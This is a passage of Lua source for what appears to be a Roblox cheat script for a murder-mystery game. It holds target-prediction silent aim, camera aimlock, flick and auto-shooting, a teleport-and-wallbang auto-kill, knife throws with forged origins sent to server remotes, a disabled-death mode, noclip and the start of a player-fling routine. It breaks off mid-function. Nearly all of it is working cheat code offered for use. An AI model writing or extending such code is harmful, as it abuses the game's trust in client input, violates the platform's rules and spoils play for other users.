    FuturePos += CurveOffset * EffectiveTime

    if Humanoid then
        local MoveDir = Humanoid.MoveDirection
        if MoveDir.Magnitude > 0.1 then
            local BaseDir = HorizontalVelocity.Magnitude > 0 and HorizontalVelocity.Unit or Vector3.zero
            if math.abs(MoveDir.Unit:Dot(BaseDir)) < 0.5 then
                FuturePos += MoveDir.Unit * HorizontalVelocity.Magnitude * EffectiveTime * 0.35
            end
        end
    end

    if Settings.PredictJump and math.abs(CurrentVelocity.Y) > 2 then
        local VerticalOffset = math.clamp(CurrentVelocity.Y * EffectiveTime * 0.6, -1, 1.3)
        FuturePos += Vector3.new(0, VerticalOffset, 0)
    end
    
    if Settings.OffsetMultiplier and Settings.OffsetMultiplier.Knife then
        local OffsetSettings = Settings.OffsetMultiplier.Knife
	    local OffsetVector = FuturePos - Root.Position
	    local Horizontal = Vector3.new(OffsetVector.X, 0, OffsetVector.Z) * OffsetSettings.X
        local Vertical = Vector3.new(0, OffsetVector.Y, 0) * OffsetSettings.Y 
        
        local XFactor = 1 + ((OffsetSettings.X - 1) / 15)
        local YFactor = 1 + ((OffsetSettings.Y - 1) / 15)

        Horizontal = Horizontal * XFactor
        Vertical = Vertical * YFactor
        
        FuturePos = Root.Position + Horizontal + Vertical
    end
    
    if Settings.ResolverAssistant then
	    local Params = RaycastParams.new()
	    Params.FilterType = Enum.RaycastFilterType.Blacklist
	    Params.FilterDescendantsInstances = {LocalPlayer.Character, Character}
    
	    local DownRay = workspace:Raycast(FuturePos, Vector3.new(0, -8, 0), Params)
	    if DownRay then
            local HeightDiff = math.abs(FuturePos.Y - DownRay.Position.Y)
            if HeightDiff < 4 then
                FuturePos = Vector3.new(FuturePos.X, math.max(FuturePos.Y, DownRay.Position.Y), FuturePos.Z)
            end
        end

        local RayDirection = Vector3.new(FuturePos.X - Root.Position.X, 0, FuturePos.Z - Root.Position.Z)
        if RayDirection.Magnitude > 0.01 then
            local RayResult = workspace:Raycast(Root.Position, RayDirection, Params)
            if RayResult then
                local HitPart = RayResult.Instance
                if HitPart and HitPart.Anchored then
                    local HitDistance = Vector3.new(RayResult.Position.X, 0, RayResult.Position.Z) - Vector3.new(Root.Position.X, 0, Root.Position.Z)
                    if HitDistance.Magnitude < RayDirection.Magnitude then
                        FuturePos = Vector3.new(RayResult.Position.X, FuturePos.Y, RayResult.Position.Z)
                    end
                end
            end
        end
    end

    if Speed < 0.1 then
        FuturePos = Head.Position
    end

    if Distance <= 25 then
        local closeScale = math.clamp(Distance / 25, 0.45, 1)
        FuturePos = Root.Position:Lerp(FuturePos, closeScale)
    end

    return FuturePos
end

function DFunctions.PredictGun(Character)
    if not Character then return end

    local Type = DConfiguration.Combat.SilentAim.GunShot.Type
    local Settings = DConfiguration.Combat.Settings

    local Root = Character:FindFirstChild("HumanoidRootPart")
    local Head = Character:FindFirstChild("Head")
    if not Root or not Head then return end
    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then return end

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local Now = tick()
    local Cache = PredictionVariables.Gun

    Cache.DeltaTimeCache = Cache.DeltaTimeCache or {}
    local LastTime = Cache.DeltaTimeCache[Character] or Now
    local dt = math.clamp(Now - LastTime, 0.001, 0.1)
    Cache.DeltaTimeCache[Character] = Now

    local Velocity = Root.AssemblyLinearVelocity or Vector3.zero
    local SimulatedVelocity = DFunctions.GetSimulatedVelocity(Root) or Velocity
    local VelocityDifference = (Velocity - SimulatedVelocity).Magnitude
    local AntiLock = Settings.AntiLockDetection and (VelocityDifference > 8 or Velocity.Magnitude < 0.2)
    local CurrentVelocity = AntiLock and SimulatedVelocity or Velocity
    local HorizontalVelocity = Vector3.new(CurrentVelocity.X, 0, CurrentVelocity.Z)
    local Speed = CurrentVelocity.Magnitude

    Cache.LagVelocityCache[Character] = CurrentVelocity
    Cache.LagTimeCache[Character] = Now

    local LagVelocity = Cache.LagVelocityCache[Character]
    local LagTime = Cache.LagTimeCache[Character]

    if LagVelocity and LagTime then
        local TimeDiff = math.clamp(Now - LagTime, 0, 0.2)
        local VelocityDelta = CurrentVelocity - LagVelocity
        CurrentVelocity += VelocityDelta * TimeDiff
    end
    
    local LastSpeed = Cache.LastSpeed and Cache.LastSpeed[Character] or Speed
    
    local Delta = Speed - LastSpeed
    local MaxDelta = 60

    if Delta > MaxDelta then
        Speed = LastSpeed + MaxDelta
    elseif Delta < -MaxDelta then
        Speed = LastSpeed - MaxDelta
    end

    if Speed > 120 then
       Speed = 120
    end

    Cache.LastSpeed = Cache.LastSpeed or {}
    Cache.LastSpeed[Character] = Speed
    
    local HitRoll = math.random(1, 100)

    if Settings.HeadPrediction.Enabled and HitRoll <= Settings.HeadPrediction.HitChance then
        Root = Character:FindFirstChild("Head")
    else
        Root = Character:FindFirstChild("HumanoidRootPart")
    end

    local Distance = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
    local TravelTime = math.clamp(Distance / 900, 0.1, 0.5)
    
    local Ping
    local PingFactor
    
    if Settings.PingBased.Type == "Server" then
        Ping = math.clamp(getgenv().CurrentServerPing or 80, 0, 500)
        PingFactor = math.clamp(Ping / 1000, 0.01, 0.5)
    elseif Settings.PingBased.Type == "Client" then
        Ping = math.clamp(getgenv().CurrentLocalPing or 80, 0, 500)
        PingFactor = math.clamp(Ping, 0.01, 0.5)
    elseif Settings.PingBased.Type == "Adaptive" then
        local ServerPing = math.clamp(getgenv().CurrentServerPing or 80, 0, 500)
        local ClientPing = math.clamp(getgenv().CurrentLocalPing or 80, 0, 500)

        Ping = (ServerPing * 0.5) + (ClientPing * 0.5)
        PingFactor = math.clamp(Ping / 1000, 0.01, 0.5)
    end
    
    local PingSeconds = math.clamp((Settings.PingBased.Interval or 100) / 1000, 0.01, 0.5)

    local EffectiveTime = TravelTime
    if Settings.PingBased.Enabled then
        if Settings.PingBased.LatencyMode then
            EffectiveTime += PingFactor
        else
            EffectiveTime += PingSeconds
        end
    end
    
    Cache.LastPosition = Cache.LastPosition or {}

    local LastPos = Cache.LastPosition[Character]
    if LastPos then
        local PositionDelta = (Root.Position - LastPos).Magnitude
        if PositionDelta > 9 then
            TravelTime *= 0.65
        end
    end
    
    Cache.LastDirection = Cache.LastDirection or {}
    local CurrentDir = HorizontalVelocity.Magnitude > 0 and HorizontalVelocity.Unit or Vector3.zero
    local LastDir = Cache.LastDirection[Character]

    if LastDir and CurrentDir then
        local TurnDot = math.clamp(LastDir:Dot(CurrentDir), -1, 1)

        if TurnDot < 0.3 then
            EffectiveTime *= 0.7
        elseif TurnDot < 0.6 then
            EffectiveTime *= 0.85
        end
    end
    
    Cache.LastPosition[Character] = Root.Position
    Cache.LastDirection[Character] = CurrentDir or Vector3.new(0,0,1)
    
    local MovementType = "Idle"

    if HorizontalVelocity.Magnitude > 2 then
        if Humanoid then
            local MoveDir = Humanoid.MoveDirection
            if MoveDir.Magnitude > 0.1 then
                local Dot = MoveDir.Unit:Dot(HorizontalVelocity.Unit)
                if Dot > 0.6 then
                    MovementType = "Forward"
                elseif Dot < -0.4 then
                    MovementType = "Backward"
                else
                    MovementType = "Strafe"
                end
            end
        end
    end

    if MovementType == "Idle" then
        EffectiveTime *= 0.55
    elseif MovementType == "Strafe" then
       EffectiveTime *= 0.85
    elseif MovementType == "Backward" then
       EffectiveTime *= 0.9
    elseif MovementType == "Forward" then
       EffectiveTime *= 1.05
    end

    local FutureVelocity = HorizontalVelocity * EffectiveTime
    local FutureLookVector = Root.CFrame.LookVector * EffectiveTime * 0.5

    local FuturePos = Root.Position
    local diff = LocalPlayer.Character.HumanoidRootPart.Position - Root.Position
    local flat = Vector3.new(diff.X, 0, diff.Z)
    local Direction = flat.Magnitude > 0 and flat.Unit or Vector3.zero
    local ForwardPush = Direction * Speed * EffectiveTime
    if ForwardPush.Magnitude > 35 then
       ForwardPush = ForwardPush.Unit * 35
    end

    if Type == "Vazex" then
        FuturePos = Root.Position + FutureVelocity
    elseif Type == "Phaze" then
        FuturePos = Root.Position + FutureVelocity + FutureLookVector
    elseif Type == "Hexa" then
        FuturePos = Root.Position + ForwardPush + FutureVelocity
    elseif Type == "Nova" then
        FuturePos = Root.Position + ForwardPush + FutureVelocity + FutureLookVector
    end

    if Humanoid then
        local MoveDir = Humanoid.MoveDirection
        if MoveDir.Magnitude > 0.1 then
            local Dot = MoveDir.Unit:Dot(HorizontalVelocity.Magnitude > 0 and HorizontalVelocity.Unit or Vector3.zero)
            if math.abs(Dot) < 0.5 then
                FuturePos += MoveDir.Unit * Speed * EffectiveTime * 0.5
            end
        end
    end

    if Settings.PredictJump and math.abs(CurrentVelocity.Y) > 2 then
        local VerticalOffset = math.clamp(CurrentVelocity.Y * EffectiveTime * 0.6, -3, 3)
        FuturePos += Vector3.new(0, VerticalOffset, 0)
    end

    if CurrentVelocity.Magnitude < 0.1 then
        FuturePos = Head.Position
    end

    Cache.CurveHistory[Character] = Cache.CurveHistory[Character] or {}
    local History = Cache.CurveHistory[Character]

    local LastPos = History.LastPosition or Root.Position
    local PrevVec = LastPos - Root.Position
    local CurrVec = Root.Position - LastPos

    local AngularVel = Vector3.zero

    if PrevVec.Magnitude > 0 and CurrVec.Magnitude > 0 then
        local Angle = math.acos(math.clamp(PrevVec.Unit:Dot(CurrVec.Unit), -1, 1))
        local AngularSpeed = Angle / dt
        local Axis = PrevVec:Cross(CurrVec)
        if Axis.Magnitude > 0 then
            AngularVel = Axis.Unit * AngularSpeed
        end
    end

    local SpinStrength = AngularVel.Magnitude
    if SpinStrength > 0.05 then
        local SpinFactor = math.clamp(SpinStrength / 6, 0, 1)
        local CurveOffset = AngularVel.Unit * EffectiveTime * 5 * SpinFactor
        FuturePos += CurveOffset

        local ForwardDir = HorizontalVelocity.Magnitude > 0 and HorizontalVelocity.Unit or Vector3.zero
        local ForwardReduction = ForwardDir * HorizontalVelocity.Magnitude * EffectiveTime * 0.6 * SpinFactor
        FuturePos -= ForwardReduction
    end

    History.LastPosition = Root.Position

    local ResolverData = Cache.ResolverCache[Character]

    if ResolverData then
        local DeltaPos = (Root.Position - ResolverData.LastPosition).Magnitude
        local SpeedEstimate = DeltaPos / dt
        local PredictedDelta = (FuturePos - Root.Position).Magnitude

        if SpeedEstimate > 130 or PredictedDelta > 35 then
            FuturePos = Root.Position:Lerp(FuturePos, 0.45)
        end
    end

    Cache.ResolverCache[Character] = {
        LastPosition = Root.Position
    }

    local LastPredicted = Cache.StabilizerCache[Character]
    
    if Settings.OffsetMultiplier and Settings.OffsetMultiplier.Gun then
        local OffsetSettings = Settings.OffsetMultiplier.Gun
        local OffsetVector = FuturePos - Root.Position
        local Horizontal = Vector3.new(OffsetVector.X, 0, OffsetVector.Z) * OffsetSettings.X
        local Vertical = Vector3.new(0, OffsetVector.Y, 0) * OffsetSettings.Y 

        local XFactor = 1 + ((OffsetSettings.X - 1) / 15)
        local YFactor = 1 + ((OffsetSettings.Y - 1) / 15)

        Horizontal = Horizontal * XFactor
        Vertical = Vertical * YFactor

        FuturePos = Root.Position + Horizontal + Vertical
    end
    
    if Settings.ResolverAssistant then
	    local Params = RaycastParams.new()
	    Params.FilterType = Enum.RaycastFilterType.Blacklist
	    Params.FilterDescendantsInstances = {LocalPlayer.Character, Character}
    
	    local DownRay = workspace:Raycast(FuturePos, Vector3.new(0, -8, 0), Params)
	    if DownRay then
            local HeightDiff = math.abs(FuturePos.Y - DownRay.Position.Y)
            if HeightDiff < 4 then
                FuturePos = Vector3.new(FuturePos.X, math.max(FuturePos.Y, DownRay.Position.Y), FuturePos.Z)
            end
        end

        local RayDirection = Vector3.new(FuturePos.X - Root.Position.X, 0, FuturePos.Z - Root.Position.Z)
        if RayDirection.Magnitude > 0.01 then
            local RayResult = workspace:Raycast(Root.Position, RayDirection, Params)
            if RayResult then
                local HitPart = RayResult.Instance
                if HitPart and HitPart.Anchored then
                    local HitDistance = Vector3.new(RayResult.Position.X, 0, RayResult.Position.Z) - Vector3.new(Root.Position.X, 0, Root.Position.Z)
                    if HitDistance.Magnitude < RayDirection.Magnitude then
                        FuturePos = Vector3.new(RayResult.Position.X, FuturePos.Y, RayResult.Position.Z)
                    end
                end
            end
        end
    end
    
    if LastPredicted then
        local Delta = (FuturePos - LastPredicted).Magnitude
        if Delta < 15 then
            local Strength = math.clamp(1 - (EffectiveTime * 2), 0.15, 0.5)
            FuturePos = LastPredicted:Lerp(FuturePos, Strength)
        end
    end

    Cache.StabilizerCache[Character] = FuturePos

    if Distance <= 40 then
        local closeScale = math.clamp(Distance / 40, 0.65, 1)
        FuturePos = Root.Position:Lerp(FuturePos, closeScale)
    end

    return FuturePos
end

-- Indicator lol

local IndicatorPart = Instance.new("Part", Workspace)
IndicatorPart.Name = "Part"
IndicatorPart.Size = Vector3.new(1, 1, 1)
IndicatorPart.Transparency = 0
IndicatorPart.Color = Color3.fromRGB(0, 255, 0)
IndicatorPart.Material = Enum.Material.Neon
IndicatorPart.Anchored = true
IndicatorPart.CanCollide = false

local ThrowingKnifeIndicator = Instance.new("Part", Workspace)
ThrowingKnifeIndicator.Name = "Part"
ThrowingKnifeIndicator.Size = Vector3.new(1, 1, 1)
ThrowingKnifeIndicator.Transparency = 0
ThrowingKnifeIndicator.Color = Color3.fromRGB(1, 0, 0)
ThrowingKnifeIndicator.Material = Enum.Material.Neon
ThrowingKnifeIndicator.Anchored = true
ThrowingKnifeIndicator.CanCollide = false

function DFunctions.ShowIndicator()
    local char = LocalPlayer.Character
    local hrp = char and char:FindFirstChild("RightHand")
    if not hrp then return end

    local hasKnife = LocalPlayer.Backpack:FindFirstChild("Knife") or (char and char:FindFirstChild("Knife"))
    local targets = hasKnife and MurderTarget() or SheriffTarget()

    if not targets or #targets == 0 then
        IndicatorPart.Transparency = 1
        return
    end

    local nearest, nearestDist = nil, math.huge
    for _, target in ipairs(targets) do
        local root = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
        if root then
            local dist = (hrp.Position - root.Position).Magnitude
            if dist < nearestDist then
                nearest = target
                nearestDist = dist
            end
        end
    end

    if nearest and nearest.Character and nearest.Character:FindFirstChild("HumanoidRootPart") then
        local Character = nearest.Character
        local FuturePos = hasKnife and DFunctions.PredictKnife(Character) or DFunctions.PredictGun(Character)
        if not FuturePos then 
            IndicatorPart.Transparency = 1
            return
        end

        local direction = (FuturePos - hrp.Position).Unit
        local distance = (FuturePos - hrp.Position).Magnitude

        IndicatorPart.Size = Vector3.new(0.1, 0.1, distance)
        IndicatorPart.CFrame = CFrame.new(hrp.Position + direction * distance / 2, FuturePos)
        IndicatorPart.Transparency = 0
    else
        IndicatorPart.Transparency = 1
    end
end

-- Automation Functions

function DFunctions.ShootGun(wallbangstate)
    if not (LocalPlayer.Character:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun")) then
        return
    end

    local targets = SheriffTarget()           
    local nearest, nearestDist = nil, math.huge
    for _, t in ipairs(targets) do
        if t and t.Character and t.Character.PrimaryPart then
            local Root = t.Character.PrimaryPart
            local dist = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
            if dist < nearestDist then
                nearest = t
                nearestDist = dist
            end
        end
    end

    local Character = nearest.Character
    local Root = Character and Character.PrimaryPart
    if not Root then return end

    DFunctions.EquipTool("Gun")
    local FuturePos = DFunctions.PredictGun(Character)
    
    local hrp = LocalPlayer.Character.HumanoidRootPart
    task.spawn(function()
	    local lookEnd = tick() + 0.5
        while DConfiguration.Combat.Sheriff.Gun.LookAt and tick() < lookEnd do
	        if not hrp or not Root or not Root.Parent then break end
            hrp.CFrame = CFrame.new(hrp.Position, Vector3.new(FuturePos.X, hrp.Position.Y, FuturePos.Z))
            task.wait()
        end
    end)

    task.spawn(function()
        -- LocalPlayer.Character.Gun.KnifeLocal.CreateBeam.RemoteFunction:InvokeServer(1, FuturePos, "AH2")
        if wallbangstate == true or DConfiguration.Combat.SilentAim.GunShot.InstantShoot then
            LocalPlayer.Character.Gun.Shoot:FireServer(CFrame.new(Root.Position - Root.CFrame.LookVector * 0.95), CFrame.new(FuturePos))
        else
            LocalPlayer.Character.Gun.Shoot:FireServer(CFrame.new(LocalPlayer.Character.RightHand.Position), CFrame.new(FuturePos))
        end
    end)

    wait(0.1)
    
    if DConfiguration.Combat.Sheriff.Gun.UnequipGun then
        LocalPlayer.Character.Humanoid:UnequipTools()
    end
end

function DFunctions.AimlockMurderer()
	local targets = SheriffTarget()
	local nearest, nearestDist = nil, math.huge

	for _, t in ipairs(targets) do
		if t and t.Character and t.Character.PrimaryPart and InCircle(t.Character) then
			local Root = t.Character.PrimaryPart
			local dist = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
			if dist < nearestDist then
				nearest = t
				nearestDist = dist
			end
		end
	end

	if not nearest then return end

	local Character = nearest.Character
	local Root = Character and Character.PrimaryPart
	local Head = Character and Character:FindFirstChild("Head")
	if not Root or not Head then return end

	local FuturePos = DFunctions.PredictGun(Character)
	local AimPart = DConfiguration.Combat.Camera.Aimbot.AimPart
	local currentCF = Camera.CFrame
	local targetCF

	if AimPart == "Head" then
		targetCF = CFrame.lookAt(currentCF.Position, Head.Position)
	elseif AimPart == "Torso" then
		targetCF = CFrame.lookAt(currentCF.Position, Root.Position)
	elseif AimPart == "Prediction" and FuturePos then
		targetCF = CFrame.lookAt(currentCF.Position, FuturePos)
	end

	if not targetCF then return end

	Camera.CFrame = currentCF:Lerp(targetCF, DConfiguration.Combat.Camera.Aimbot.Smoothness)
end

function DFunctions.AimlockNearest()
	local targets = MurderTarget()
	local nearest, nearestDist = nil, math.huge

	for _, t in ipairs(targets) do
		if t and t.Character and t.Character.PrimaryPart and InCircle(t.Character) then
			local Root = t.Character.PrimaryPart
			local dist = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
			if dist < nearestDist then
				nearest = t
				nearestDist = dist
			end
		end
	end

	if not nearest then return end

	local Character = nearest.Character
	local Root = Character and Character.PrimaryPart
	local Head = Character and Character:FindFirstChild("Head")
	if not Root or not Head then return end

	local FuturePos = DFunctions.PredictKnife(Character)
	local AimPart = DConfiguration.Combat.Camera.Aimbot.AimPart
	local currentCF = Camera.CFrame
	local targetCF

	if AimPart == "Head" then
		targetCF = CFrame.lookAt(currentCF.Position, Head.Position)
	elseif AimPart == "Torso" then
		targetCF = CFrame.lookAt(currentCF.Position, Root.Position)
	elseif AimPart == "Prediction" and FuturePos then
		targetCF = CFrame.lookAt(currentCF.Position, FuturePos)
	end

	if not targetCF then return end

	Camera.CFrame = currentCF:Lerp(targetCF, DConfiguration.Combat.Camera.Aimbot.Smoothness)
end

function DFunctions.FlickShoot(Type, Duration)
    local char = LocalPlayer.Character
    if not char then
        return
    end

    if not (char:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun")) then
        return
    end

    local targets = SheriffTarget()
    local nearest, nearestDist = nil, math.huge

    for _, t in ipairs(targets) do
        if t and t.Character and t.Character.PrimaryPart then
            local Root = t.Character.PrimaryPart
            local dist = (char.HumanoidRootPart.Position - Root.Position).Magnitude
            if dist < nearestDist then
                nearest = t
                nearestDist = dist
            end
        end
    end

    if not nearest then
        return
    end

    local Character = nearest.Character
    local Root = Character and Character.PrimaryPart
    if not Root then
        return
    end

    DFunctions.EquipTool("Gun")

    local FuturePos = DFunctions.PredictGun(Character)
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then
        return
    end

    local oldCF = Camera.CFrame
    local targetCF = CFrame.lookAt(Camera.CFrame.Position, FuturePos)

    local t0 = tick()
    while tick() - t0 < Duration do
        local alpha = (tick() - t0) / Duration
        Camera.CFrame = oldCF:Lerp(targetCF, alpha)
        task.wait()
    end

    FuturePos = DFunctions.PredictGun(Character)
    LocalPlayer.Character.Gun.Shoot:FireServer(CFrame.new(LocalPlayer.Character.RightHand.Position), CFrame.new(FuturePos))

    local backStart = tick()
    local currentCF = Camera.CFrame

    while tick() - backStart < Duration do
        local alpha = (tick() - backStart) / Duration
        Camera.CFrame = currentCF:Lerp(oldCF, alpha)
        task.wait()
    end

    Camera.CFrame = oldCF

    task.wait(0.1)

    if DConfiguration.Combat.Sheriff.Gun.UnequipGun then
        char.Humanoid:UnequipTools()
    end
end

function DFunctions.AutoKillMurderer(Type)
    if LocalPlayer.Character:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun") then
        local Murderer = Players:FindFirstChild(tostring(Roles.Murderer))
        if Type == "Behind" then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Murderer.Character.HumanoidRootPart.Position) * CFrame.new(0, 0, 5)
            DFunctions.ShootGun(false)
        elseif Type == "Instant Shoot" then
            DFunctions.ShootGun(true)
        elseif Type == "Wallbang" then
            LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Murderer.Character.HumanoidRootPart.Position) * CFrame.new(0, -50, 0)
            DFunctions.ShootGun(true)
        end
    end
end

function DFunctions.AutoShootGun()
    if LocalPlayer.Character:FindFirstChild("Gun") or LocalPlayer.Backpack:FindFirstChild("Gun") then
        local targets = SheriffTarget()
        local nearest, nearestDist = nil, math.huge
        for _, t in ipairs(targets) do
            if t and t.Character and t.Character.PrimaryPart then
                local Root = t.Character.PrimaryPart
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - Root.Position).Magnitude
                if dist < nearestDist then
                    nearest = t
                    nearestDist = dist
                end
            end
        end

        if nearest and nearest.Character and (not DConfiguration.Combat.Sheriff.Gun.AutoShoot.WallCheck or DFunctions.NotObstructing(nearest.Character)) then
            if DConfiguration.Combat.Sheriff.Gun.AutoShoot.Type == "Shoot Murd" then
                wait(DConfiguration.Combat.Sheriff.AutoShoot.Delay)
                spawn(DFunctions.ShootGun)
                wait(2)
            elseif DConfiguration.Combat.Sheriff.Gun.AutoShoot.Type == "Murderer with a Knife" then
                if (nearest.Character:FindFirstChild("Knife") and nearest.Character.Knife:GetAttribute("IsKnife")) or (DConfiguration.Combat.Sheriff.Gun.AutoShoot.ForceShoot == true and (nearest.Backpack:FindFirstChild("Knife") or nearest.Character:FindFirstChild("Knife"))) then
                    wait(DConfiguration.Combat.Sheriff.AutoShoot.Delay)
                    spawn(DFunctions.ShootGun)

                    DConfiguration.Combat.Sheriff.Gun.AutoShoot.ForceShoot = true
                    if not nearest.Character or not nearest.Character:FindFirstChildOfClass("Humanoid") or nearest.Character:FindFirstChildOfClass("Humanoid").Health <= 0 then
                        DConfiguration.Combat.Sheriff.Gun.AutoShoot.ForceShoot = false
                    end
                    wait(2)
                end
            end
        end
    end
end

function DFunctions.ThrowKnives()
    local Character = LocalPlayer.Character
    if not Character then return end
    
    local knife = Character:FindFirstChild("Knife")
    if not knife then
        Config.IsThrowing = false
        return
    end

    local Config = DConfiguration.Combat.Murderer.KnifeThrow

    Config.LastThrow = Config.LastThrow or 0
    local Cooldown = Config.Cooldown or 2
    
    if Config.IsThrowing then return end
    if tick() - Config.LastThrow < Cooldown then return end

    Config.LastThrow = tick()
    Config.IsThrowing = true

    local nearestPlayer, nearestDistance

    for _, v in pairs(Players:GetPlayers()) do
        if v ~= LocalPlayer and v.Character then
            local playerChar = v.Character
            local Root = playerChar:FindFirstChild("HumanoidRootPart")

            if Root and Character:FindFirstChild("HumanoidRootPart") then
                local distance = (Character.HumanoidRootPart.Position - Root.Position).Magnitude

                if (not Config.WallCheck) or (Config.WallCheck and DFunctions.NotObstructing(playerChar)) then
                    if not nearestPlayer or distance < nearestDistance then
                        nearestPlayer = v
                        nearestDistance = distance
                    end
                end
            end
        end
    end

    if not nearestPlayer or not nearestPlayer.Character then
        Config.IsThrowing = false
        return
    end

    local TargetCharacter = nearestPlayer.Character
    local Root = TargetCharacter:FindFirstChild("HumanoidRootPart")
    local RightHand = Character:FindFirstChild("RightHand") or Character:FindFirstChild("Right Arm")

    if not Root or not RightHand then
        Config.IsThrowing = false
        return
    end

    local origin = RightHand.Position
    local args = {}
    local Velocity = Root.AssemblyLinearVelocity

    local Humanoid = Character:FindFirstChildOfClass("Humanoid")
    local Animator = Humanoid and Humanoid:FindFirstChildOfClass("Animator")

    if Config.Animated and Animator then
        Config.TracksCache = Config.TracksCache or {}
        local Tracks = Config.TracksCache

        if not Tracks.ThrowCharge or not Tracks.ThrowCharge.Parent then
            Tracks.ThrowCharge = Animator:LoadAnimation(knife.KnifeClient.ThrowCharge)
            Tracks.ThrowHold = Animator:LoadAnimation(knife.KnifeClient.ThrowHold)
            Tracks.ThrowKnife = Animator:LoadAnimation(knife.KnifeClient.ThrowKnife)

            Tracks.ThrowCharge.Priority = Enum.AnimationPriority.Action
            Tracks.ThrowHold.Priority = Enum.AnimationPriority.Action
            Tracks.ThrowKnife.Priority = Enum.AnimationPriority.Action
        end

        if Tracks.ThrowCharge.IsPlaying then Tracks.ThrowCharge:Stop() end
        if Tracks.ThrowHold.IsPlaying then Tracks.ThrowHold:Stop() end
        if Tracks.ThrowKnife.IsPlaying then Tracks.ThrowKnife:Stop() end

        Tracks.ThrowCharge:Play()
        task.wait(0.1)
        Tracks.ThrowCharge:Stop()        
        Tracks.ThrowHold:Play()
        task.wait(0.3)
        Tracks.ThrowHold:Stop()
        Tracks.ThrowKnife:Play()
    end

    local FuturePos = DFunctions.PredictKnife(TargetCharacter)
    
    if not FuturePos then return end

    if DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Normal" then
        args[1] = CFrame.new(origin)
        args[2] = CFrame.new(FuturePos)
    elseif DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Fast" then
        local distance = (Character.HumanoidRootPart.Position - Root.Position).Magnitude
        local fakeOrigin = origin

        if DFunctions.NotObstructing(TargetCharacter) then
            local norm = math.clamp(distance / 150, 0, 1)
		
	        local t = 0.25 + (0.5 * (norm ^ 0.6))
            fakeOrigin = origin:Lerp(Root.Position, t)
        end

        args[1] = CFrame.new(fakeOrigin)
        args[2] = CFrame.new(FuturePos)
    elseif DConfiguration.Combat.SilentAim.Throwing.ThrowSpeed == "Instant" then
        local predict = Root.Position - Root.CFrame.LookVector * 0.95
        args[1] = CFrame.new(predict)
        args[2] = CFrame.new(FuturePos)
    end

    knife.Events.KnifeThrown:FireServer(unpack(args))

    task.delay(Cooldown, function()
        Config.IsThrowing = false
    end)
end

function DFunctions.TwoLivesMode()
	 local char = LocalPlayer.Character
 	local hum = char.Humanoid
	
 	if char and hum then
         hum:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
		 hum:SetStateEnabled(Enum.HumanoidStateType.Dead, false)
		 hum:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
     end
 end
 
 function DFunctions.NoClip()
   local char = LocalPlayer.Character
   
   if char then
	    for i, v in pairs(char:GetDescendants()) do
			if v:IsA("BasePart") or v:IsA("MeshPart") then
		       v.CanCollide = false
			end
	    end
    end
end

function DFunctions.AntiFling()
    local Character = LocalPlayer.Character
    if not Character then return end

    local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart")
    if not HumanoidRootPart then return end

    for _, v in ipairs(Players:GetPlayers()) do
        if v ~= LocalPlayer then
            local EnemyCharacter = v.Character
            if EnemyCharacter and EnemyCharacter:IsDescendantOf(workspace) then
                local PrimaryPart = EnemyCharacter.PrimaryPart or EnemyCharacter:FindFirstChild("HumanoidRootPart")
                if PrimaryPart then
                    local LinearVelocity = PrimaryPart.AssemblyLinearVelocity.Magnitude
                    local AngularVelocity = PrimaryPart.AssemblyAngularVelocity.Magnitude

                    if LinearVelocity > 100 or AngularVelocity > 50 then                    
                        for _, Part in ipairs(EnemyCharacter:GetDescendants()) do
                            if Part:IsA("BasePart") and Part.Name ~= "Handle" then
                                Part.CanCollide = false
                                Part.AssemblyLinearVelocity = Vector3.zero
                                Part.AssemblyAngularVelocity = Vector3.zero
                                Part.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                            end
                        end
                    end
                end
            end
        end
    end
    
    local LastPos = HumanoidRootPart.Position
    local LastVelocity = (HumanoidRootPart.AssemblyLinearVelocity.Magnitude > 250 and Vector3.new(0,0,0)) or HumanoidRootPart.AssemblyLinearVelocity
    local LastAngularVelocity = (HumanoidRootPart.AssemblyAngularVelocity.Magnitude > 250 and Vector3.new(0,0,0)) or HumanoidRootPart.AssemblyAngularVelocity
    
    if HumanoidRootPart.AssemblyLinearVelocity.Magnitude > 250 or HumanoidRootPart.AssemblyAngularVelocity.Magnitude > 250 then
	    HumanoidRootPart.AssemblyLinearVelocity = LastVelocity
	    HumanoidRootPart.AssemblyAngularVelocity = LastAngularVelocity
	    HumanoidRootPart.CFrame = CFrame.new(LastPos)
	else
		LastPos = HumanoidRootPart.Position
    end
end
 
 function DFunctions.SpectatePlayer(Name)
    local Target = Players:FindFirstChild(Name)
    if Target and Target.Character then
        local Humanoid = Target.Character:FindFirstChildWhichIsA("Humanoid")
        if Humanoid then
            Camera.CameraSubject = Humanoid
        end
    end
end

function SkidFling(TargetPlayer)
    local Character = LocalPlayer.Character
    local Humanoid = Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart = Humanoid and Humanoid.RootPart
    local TCharacter = TargetPlayer.Character
    if not TCharacter then return end

    local THumanoid
    local TRootPart
    local THead
    local Accessory
    local Handle

    if TCharacter:FindFirstChildOfClass("Humanoid") then
        THumanoid = TCharacter:FindFirstChildOfClass("Humanoid")
    end
    if THumanoid and THumanoid.RootPart then
        TRootPart = THumanoid.RootPart
    end
    if TCharacter:FindFirstChild("Head") then
        THead = TCharacter.Head
    end
    if TCharacter:FindFirstChildOfClass("Accessory") then
        Accessory = TCharacter:FindFirstChildOfClass("Accessory")
    end
    if Accessory and Accessory:FindFirstChild("Handle") then
        Handle = Accessory.Handle
    end

